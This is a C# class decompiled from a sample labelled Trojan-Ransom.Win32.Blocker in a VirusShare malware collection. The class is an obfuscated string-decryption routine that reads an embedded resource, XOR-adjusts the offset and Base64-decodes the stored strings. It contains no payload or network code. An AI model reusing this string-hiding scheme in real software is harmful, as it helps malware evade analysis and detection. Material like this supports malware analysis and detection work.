// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2EAA04FB-4A12-46FB-89C9-8F20DEF80030
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.heqk-a676fa6fd1e5c420949ebe87d886c57cc8693a1c182562bacd2c8a70cf0dc574.exe

using \u0003;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0003
{
  internal sealed class \u0002
  {
    private static Stream \u0001;
    private static int \u0002 = 0;

    public static string \u001C([In] int obj0)
    {
      byte[] numArray;
      lock (typeof (\u0002))
      {
        if (\u0002.\u0001 == null)
        {
          Assembly executingAssembly = Assembly.GetExecutingAssembly();
          \u0002.\u0001 = executingAssembly.GetManifestResourceStream("{2eaa04fb-4a12-46fb-89c9-8f20def80030}");
          byte[] publicKeyToken = executingAssembly.GetName().GetPublicKeyToken();
          if (publicKeyToken != null)
          {
            for (int index = 0; index < publicKeyToken.Length - 1; index += 2)
              \u0002.\u0002 ^= ((int) publicKeyToken[index] << 8) + (int) publicKeyToken[index + 1];
          }
        }
        \u0002.\u0001.Position = (long) (obj0 - \u0002.\u0002);
        int num = \u0002.\u0001.ReadByte();
        int count = (num & 128) != 0 ? ((num & 64) != 0 ? ((num & 31) << 24) + (\u0002.\u0001.ReadByte() << 16) + (\u0002.\u0001.ReadByte() << 8) + \u0002.\u0001.ReadByte() : ((num & 63) << 8) + \u0002.\u0001.ReadByte()) : num;
        numArray = new byte[count];
        \u0002.\u0001.Read(numArray, 0, count);
      }
      if (numArray.Length == 0)
        return string.Empty;
      byte[] bytes = Convert.FromBase64String(Encoding.UTF8.GetString(numArray, 0, numArray.Length));
      return string.Intern(Encoding.UTF8.GetString(bytes, 0, bytes.Length));
    }
  }
}
